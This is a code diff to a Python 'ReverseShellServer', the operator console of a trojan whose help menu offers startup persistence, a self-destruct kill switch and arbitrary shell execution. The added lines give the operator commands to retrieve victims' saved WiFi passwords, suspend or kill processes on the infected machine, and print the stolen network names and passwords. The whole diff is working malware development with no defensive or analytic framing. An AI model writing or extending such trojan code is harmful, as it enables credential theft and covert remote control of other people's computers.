@@ -311,6 +311,41 @@ class ReverseShellServer:
                 else:
                     print(f"  {key}: {value}")
 
+    def display_wifi_passwords(self, wifi_data):
+        print("\n" + "="*50)
+        print("SAVED WIFI PASSWORDS")
+        print("="*50)
+        
+        wifi_passwords = wifi_data.get("wifi_passwords", [])
+        for wifi in wifi_passwords:
+            print(f"  SSID: {wifi['ssid']}")
+            print(f"  Password: {wifi['password']}")
+            print("-" * 30)
+        
+        print(f"Total networks found: {wifi_data.get('total_networks', 0)}")
+
+    def display_suspended_processes(self, data):
+        print("\n" + "="*50)
+        print("SUSPENDED PROCESSES")
+        print("="*50)
+        
+        processes = data.get("suspended_processes", [])
+        for proc in processes:
+            print(f"  PID: {proc['pid']}, Name: {proc['name']}, Status: {proc['action']}")
+        
+        print(f"Total suspended: {data.get('total_suspended', 0)}")
+
+    def display_killed_processes(self, data):
+        print("\n" + "="*50)
+        print("KILLED PROCESSES")
+        print("="*50)
+        
+        processes = data.get("killed_processes", [])
+        for proc in processes:
+            print(f"  PID: {proc['pid']}, Name: {proc['name']}, Status: {proc['action']}")
+        
+        print(f"Total killed: {data.get('total_killed', 0)}")
+
     def show_help(self):
         print("\n" + "="*50)
         print("AVAILABLE COMMANDS")
@@ -329,6 +364,10 @@ class ReverseShellServer:
         print("startup           - Add to startup")
         print("startup_remove    - Remove from startup")
         print("startup_status    - Check startup status")
+        print("wifi_passwords    - Get saved WiFi passwords")
+        print("pwd               - Show current directory")
+        print("suspend <name>    - Suspend process by name or PID")
+        print("kill <name>       - Kill process by name or PID")
         print("kill_switch       - Self-destruct trojan")
         print("<command>         - Execute shell command")
         print("exit/quit         - Exit shell")
@@ -427,6 +466,20 @@ class ReverseShellServer:
         
         elif command.lower() == 'startup_status':
             self.send_encrypted(client_sock, {"type": "check_startup", "startup_name": "SystemService"})
+        
+        elif command.lower() == 'wifi_passwords':
+            self.send_encrypted(client_sock, {"type": "wifi_passwords"})
+        
+        elif command.lower() == 'pwd':
+            self.send_encrypted(client_sock, {"type": "pwd"})
+        
+        elif command.lower().startswith('suspend '):
+            process_name = command[8:].strip()
+            self.send_encrypted(client_sock, {"type": "suspend", "command": process_name})
+        
+        elif command.lower().startswith('kill '):
+            process_name = command[5:].strip()
+            self.send_encrypted(client_sock, {"type": "kill_process", "command": process_name})
         
         elif command.lower() == 'kill_switch':
             self.send_encrypted(client_sock, {"type": "kill_switch"})
@@ -532,6 +585,30 @@ class ReverseShellServer:
                     print(f"[*] {result.get('message', 'Operation completed')}")
             elif "startup_status" in response:
                 self.display_startup_status(response["startup_status"])
+            elif "wifi_result" in response:
+                result = response["wifi_result"]
+                if "wifi_passwords" in result:
+                    self.display_wifi_passwords(result)
+                elif "error" in result:
+                    print(f"[-] WiFi password error: {result['error']}")
+            elif "pwd_result" in response:
+                result = response["pwd_result"]
+                if "current_directory" in result:
+                    print(f"\n[+] Current directory: {result['current_directory']}")
+                elif "error" in result:
+                    print(f"[-] PWD error: {result['error']}")
+            elif "suspend_result" in response:
+                result = response["suspend_result"]
+                if "suspended_processes" in result:
+                    self.display_suspended_processes(result)
+                elif "error" in result:
+                    print(f"[-] Suspend error: {result['error']}")
+            elif "kill_result" in response:
+                result = response["kill_result"]
+                if "killed_processes" in result:
+                    self.display_killed_processes(result)
+                elif "error" in result:
+                    print(f"[-] Kill error: {result['error']}")
             elif "killed" in response:
                 print(f"[+] {response['killed']}\n")
                 return False
